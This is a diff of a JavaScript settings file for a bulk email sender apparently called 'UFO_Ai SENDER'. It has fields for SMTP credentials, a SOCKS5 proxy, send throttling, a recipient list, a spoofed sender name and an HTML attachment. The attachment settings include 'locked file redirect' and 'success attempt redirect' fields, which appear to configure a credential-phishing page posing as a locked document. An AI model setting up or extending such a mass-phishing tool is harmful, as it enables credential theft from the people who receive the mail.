@@ -1,33 +1,34 @@
-/*ARQMAIL V3.3 SENDER SETTINGS FILE
-EDIT ONLY ASKED FIELD  */
+/*UFO_Ai SENDER v3.4 SETTINGS 
 
 /* SMTP SETTINGS */
-module.exports.LINK = 'APILINK'; //GET YOUR APILINK FROM ADMIN
+module.exports.LINK = ''; // APILINK
 
-module.exports.HOST = 'SMTP HOST'; // PUT SMTP HOST HERE
+module.exports.HOST = ''; // PUT SMTP HOST HERE
 module.exports.PORT = 587; // if port 587, false. if port 465 = true
 module.exports.SECURE = false; // PUT false or true HERE
-module.exports.USER = 'USERNAME'; // SMTP USERNAME
-module.exports.PASS = 'PASSWORD'; // SMTP PASSWORD
+module.exports.USER = ''; // SMTP USERNAME
+module.exports.PASS = ''; // SMTP PASSWORD
 module.exports.PROXY = ''; // PUT SOCK5 HERE socks://
-module.exports.Thread = 4000; // THREAD DELAY LIMIT IN MILISECONDS 1000 = 1 SEC
+module.exports.Thread = 4000; // THREAD DELAY LIMIT IN MILISECONDS 1000 = 1 SEC 
 
-/* LETTER, SUBJECT AND LOGO CONTROL */
+/* ATTACHMENT, LETTER, SUBJECT AND LOGO CONTROL CENTRE */
 
-module.exports.Subject = 'SUBJECT'; // SUBJECT OF YOUR LETTERconta
-module.exports.EmailFrom = 'FROM NAME <SENDING EMAIL>'; // FROM NAME AND EMAIL FROM SHOULD BE IN BETWEEN "<EMAILFROM>"
-/** module.exports.LogoPath = 'https://urlto image here/images.png'; // LOGO URL
-module.exports.LogoName = 'logo.png'; // LOGO NAME **/
-module.exports.Letter = '/letter.txt'; // LETTER NAME IN TXT SHOULD BE IN SAME FOLDER
+module.exports.Subject = ' '; // SUBJECT OF YOUR LETTERconta
+module.exports.EmailFrom = ' '; // FROM NAME AND EMAIL FROM SHOULD BE IN BETWEEN "<EMAILFROM>"
+module.exports.SENDLINK = ' '; // link or url 
+module.exports.HeaderPath = ' '; // header URL/Path
+module.exports.FooterPath = ' '; // footer URL/Path 
+module.exports.Letter = 'letter.txt'; // LETTER NAME IN TXT SHOULD BE IN SAME FOLDER
 module.exports.List = 'list.txt'; // LIST NAME IN TXT SHOULD BE IN SAME FOLDER
 
-/* ATTACHMENT SETTINGS - CONTROL */
+/* ATTACHMENT PATH N ATTACHMENT NAME CONTROL */
 module.exports.AttachmentOn = true ; // ATTACHMENT true or false
 
-module.exports.AttachName = 'ATTACHMENT NAME'; // ATTACHMENT NAME WORKS WITH FUNCTIONS
+module.exports.AttachName = ''; // ATTACHMENT NAME WORKS WITH FUNCTIONS
 module.exports.AttachmentPath = './ATTACHMENT.html'; // ATTACHMENT PATH MUST BE IN HTML
-module.exports.TITLE = 'ATTACHMENT HEADER TITLE'; // Page Title
-module.exports.BACKGROUND = 'PREFFERED ATTACHMENT BACKGROUND LINK'; // Page Background must be https:// link
-module.exports.FAVI = 'FAVICON LOGO LINK'; // page logo 
-module.exports.LOCKREDIR = 'FAILED REDIRECT LINK'; // locked file redirect
-module.exports.SUCCESSREDIR = 'SUCCESS REDIRECT LINK'; // success attempt redirect
+module.exports.TITLE = ' '; // Page Title
+module.exports.BACKGROUND = ' '; // Page Background must be https:// link
+module.exports.FAVI = ' '; // page logo 
+module.exports.LOCKREDIR = ' '; // locked file redirect
+module.exports.SUCCESSREDIR = ' '; // success attempt redirect
+
